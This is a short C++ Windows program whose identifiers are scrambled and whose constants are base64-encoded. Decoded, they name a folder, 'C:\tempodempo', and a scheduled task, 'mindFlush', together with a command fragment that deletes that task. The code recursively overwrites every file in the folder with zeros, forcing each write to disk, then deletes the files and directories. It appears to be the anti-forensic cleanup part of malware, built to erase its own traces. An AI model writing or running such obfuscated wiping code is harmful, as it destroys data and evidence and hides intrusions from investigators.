#include "base64.h"

#include <fstream>
#include <Windows.h>
#include <iostream>
#include <vector>
#define QFGXKWZU "c2NodGFza3MgL2RlbGV0ZSAvdG4gIg=="
#define XHQWAMZT "QzpcXHRlbXBvZGVtcG8="
#define YJZBDKOX "bWluZEZsdXNo"
#define UDFMCZRP "IiAvZg=="
#define SRQJTYUX "Lg=="
#define YHQFBUVW "Li4="
#define YVNWDFMO "XFw="
#define FMYQJTFP "XFwq"
#define VNJOPKXG 4096
#define YTZFQRWE 0


// Securely wipe file using Windows API (bypasses cache, forces to disk)
void RPNVQTUX(const std::string& ZQOPGMDC) {
    // Open file with write-through flag to bypass OS cache
    HANDLE hFile = CreateFileA(
        ZQOPGMDC.c_str(),
        GENERIC_WRITE,
        0,                           // No sharing
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_WRITE_THROUGH |    // Critical: bypass cache, write directly to disk
        FILE_FLAG_SEQUENTIAL_SCAN,   // Optimize for sequential access
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        return;
    }

    // Get file size
    LARGE_INTEGER fileSize;
    if (!GetFileSizeEx(hFile, &fileSize)) {
        CloseHandle(hFile);
        return;
    }

    // Prepare zero buffer
    const DWORD bufferSize = VNJOPKXG;
    std::vector<char> zeros(bufferSize, 0);
    DWORD bytesWritten;

    // Overwrite file with zeros in chunks
    for (LONGLONG offset = 0; offset < fileSize.QuadPart; offset += bufferSize) {
        DWORD toWrite = (DWORD)min((LONGLONG)bufferSize, fileSize.QuadPart - offset);

        if (!WriteFile(hFile, zeros.data(), toWrite, &bytesWritten, NULL)) {
            CloseHandle(hFile);
            return;
        }

        // Force write to physical disk after each chunk
        FlushFileBuffers(hFile);
    }

    // Final flush to ensure everything is written
    FlushFileBuffers(hFile);

    CloseHandle(hFile);

    // Now delete the file
    DeleteFileA(ZQOPGMDC.c_str());
}


void RFLNWTJH(std::string GPBVOYZW) {
    WIN32_FIND_DATAA SYWVXNUR;
    std::string GQBXMRPK = GPBVOYZW + base64_decode(FMYQJTFP);
    HANDLE ZKLNVDWV = FindFirstFileA(GQBXMRPK.c_str(), &SYWVXNUR);
    if (ZKLNVDWV == INVALID_HANDLE_VALUE) {
        FindClose(ZKLNVDWV);
        return;
    }
    do {
        std::string IYHRNGOK = SYWVXNUR.cFileName;
        if (IYHRNGOK == base64_decode(SRQJTYUX) || IYHRNGOK == base64_decode(YHQFBUVW)) { continue; }
        std::string FYMQZXVS = GPBVOYZW + base64_decode(YVNWDFMO) + IYHRNGOK;
        if (SYWVXNUR.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) { RFLNWTJH(FYMQZXVS); }
        else {
            RPNVQTUX(FYMQZXVS);
        }
    } while (FindNextFileA(ZKLNVDWV, &SYWVXNUR) != YTZFQRWE);
    FindClose(ZKLNVDWV);
    RemoveDirectoryA(GPBVOYZW.c_str());
}


int main() {
    RFLNWTJH(base64_decode(XHQWAMZT));
}
